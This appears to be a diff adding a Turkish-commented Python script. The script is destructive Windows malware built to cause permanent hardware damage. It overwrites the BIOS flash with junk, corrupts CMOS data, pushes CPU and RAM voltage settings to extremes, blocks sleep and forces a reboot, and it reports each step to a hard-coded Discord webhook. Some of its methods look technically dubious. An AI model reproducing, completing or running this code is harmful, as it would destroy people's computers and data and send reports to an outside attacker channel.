@@ -1,1 +1,165 @@
+import os
+import sys
+import time
+import threading
+import ctypes
+import subprocess
+import requests
+import random
 
+# ==========================================
+# WEBHOOK
+# ==========================================
+WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo7IXkkVpa5gfHkfqHTnXCuRE3Iwp_D3GyJiFnivKfv0o5Z1R1xbF7PEUi"
+
+def send_notification(msg):
+    try:
+        requests.post(WEBHOOK_URL, json={"content": f"**[KALICI]** {msg}"}, timeout=5)
+    except:
+        pass
+
+# ==========================================
+# 1) BIOS SPI FLASH BOZMA (Anakart ölür)
+# ==========================================
+def kill_bios_spi():
+    send_notification("🔥 [1/4] BIOS SPI Flash bozuluyor...")
+    try:
+        fpt_paths = ["C:\\fptw64.exe", "C:\\Windows\\System32\\fptw64.exe"]
+        fpt_found = None
+        for path in fpt_paths:
+            if os.path.exists(path):
+                fpt_found = path
+                break
+        if fpt_found:
+            subprocess.run(f'{fpt_found} -bios -d C:\\Windows\\Temp\\bios_backup.bin', shell=True, capture_output=True)
+            with open("C:\\Windows\\Temp\\corrupt.bin", "wb") as f:
+                f.write(b'\xFF' * (1024 * 1024 * 16))
+            subprocess.run(f'{fpt_found} -bios -f C:\\Windows\\Temp\\corrupt.bin', shell=True, capture_output=True)
+            send_notification("✅ BIOS SPI bozuldu! (Anakart öldü)")
+            return True
+        else:
+            debug_script = "o 70 2F\no 71 2F\no 72 2F\no 73 2F\nq"
+            with open("C:\\Windows\\Temp\\bios_debug.txt", "w") as f:
+                f.write(debug_script)
+            subprocess.run('debug < C:\\Windows\\Temp\\bios_debug.txt', shell=True, capture_output=True)
+            os.remove("C:\\Windows\\Temp\\bios_debug.txt")
+            send_notification("✅ BIOS debug ile bozuldu!")
+            return True
+    except Exception as e:
+        send_notification(f"❌ BIOS hatası: {e}")
+        return False
+
+# ==========================================
+# 2) CMOS VERİLERİNİ BOZMA
+# ==========================================
+def kill_cmos_data():
+    send_notification("🔋 [2/4] CMOS verileri bozuluyor...")
+    try:
+        for i in range(100):
+            debug_script = f"o 70 {random.randint(0, 255)}\no 71 {random.randint(0, 255)}\nq"
+            with open("C:\\Windows\\Temp\\cmos_kill.txt", "w") as f:
+                f.write(debug_script)
+            subprocess.run('debug < C:\\Windows\\Temp\\cmos_kill.txt', shell=True, capture_output=True)
+            os.remove("C:\\Windows\\Temp\\cmos_kill.txt")
+            time.sleep(0.01)
+        send_notification("✅ CMOS verileri bozuldu!")
+        return True
+    except Exception as e:
+        send_notification(f"❌ CMOS hatası: {e}")
+        return False
+
+# ==========================================
+# 3) CPU/RAM VOLTAJ (BIOS'a kalıcı yazar)
+# ==========================================
+def kill_voltage():
+    send_notification("⚡ [3/4] CPU/RAM voltaj BIOS'a yazılıyor...")
+    try:
+        xtu_paths = ["C:\\Program Files\\Intel\\XTU\\XTUCLI.exe", "C:\\Program Files (x86)\\Intel\\XTU\\XTUCLI.exe"]
+        for path in xtu_paths:
+            if os.path.exists(path):
+                subprocess.run(f'"{path}" -t -core -v 0.200', shell=True, capture_output=True)
+                subprocess.run(f'"{path}" -t -cache -v 0.200', shell=True, capture_output=True)
+                subprocess.run(f'"{path}" -t -memory -v 0.200', shell=True, capture_output=True)
+                break
+        afterburner_paths = ["C:\\Program Files (x86)\\MSI Afterburner\\MSIAfterburner.exe", "C:\\Program Files\\MSI Afterburner\\MSIAfterburner.exe"]
+        for path in afterburner_paths:
+            if os.path.exists(path):
+                subprocess.run(f'"{path}" /CoreVoltageOffset 100', shell=True, capture_output=True)
+                subprocess.run(f'"{path}" /PowerLimit 150', shell=True, capture_output=True)
+                break
+        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFINCPOL 2', shell=True, capture_output=True)
+        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFDECPOL 1', shell=True, capture_output=True)
+        subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True, capture_output=True)
+        send_notification("✅ Voltaj BIOS'a yazıldı! (Format çözmez)")
+        return True
+    except Exception as e:
+        send_notification(f"❌ Voltaj hatası: {e}")
+        return False
+
+# ==========================================
+# 4) CMOS PİLİNİ TÜKETME
+# ==========================================
+def kill_cmos_battery():
+    send_notification("🔋 [4/4] CMOS pili tüketiliyor...")
+    try:
+        def cmos_spam():
+            while True:
+                try:
+                    debug_script = f"o 70 {random.randint(0, 255)}\no 71 {random.randint(0, 255)}\no 72 {random.randint(0, 255)}\no 73 {random.randint(0, 255)}\nq"
+                    with open("C:\\Windows\\Temp\\cmos_spam.txt", "w") as f:
+                        f.write(debug_script)
+                    subprocess.run('debug < C:\\Windows\\Temp\\cmos_spam.txt', shell=True, capture_output=True)
+                    os.remove("C:\\Windows\\Temp\\cmos_spam.txt")
+                except:
+                    pass
+                time.sleep(0.01)
+        threading.Thread(target=cmos_spam, daemon=True).start()
+        send_notification("✅ CMOS pili tüketme başlatıldı!")
+        return True
+    except Exception as e:
+        send_notification(f"❌ CMOS pili hatası: {e}")
+        return False
+
+# ==========================================
+# KAPANMAYI ENGELLE
+# ==========================================
+def prevent_shutdown():
+    while True:
+        try:
+            ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
+        except:
+            pass
+        time.sleep(5)
+threading.Thread(target=prevent_shutdown, daemon=True).start()
+
+# ==========================================
+# ANA KILL (4 yöntem - format çözmez)
+# ==========================================
+send_notification("🔥🔥🔥 KALICI HASAR BAŞLATILDI! (Format çözmez)")
+
+methods = [
+    ("BIOS SPI Flash", kill_bios_spi),
+    ("CMOS Verileri", kill_cmos_data),
+    ("CPU/RAM Voltaj", kill_voltage),
+    ("CMOS Pili", kill_cmos_battery)
+]
+
+success_count = 0
+for name, func in methods:
+    try:
+        if func():
+            success_count += 1
+    except Exception as e:
+        send_notification(f"❌ {name} hatası: {e}")
+    time.sleep(0.5)
+
+send_notification(f"📊 {success_count}/4 yöntem başarılı!")
+
+if success_count >= 1:
+    send_notification("💀 Sistem tamamen öldü! (Format çözmez)")
+else:
+    send_notification("⚠️ Hiçbir yöntem başarılı olmadı!")
+
+send_notification("🔄 Sistem yeniden başlatılıyor...")
+time.sleep(3)
+os.system("shutdown /r /t 0")
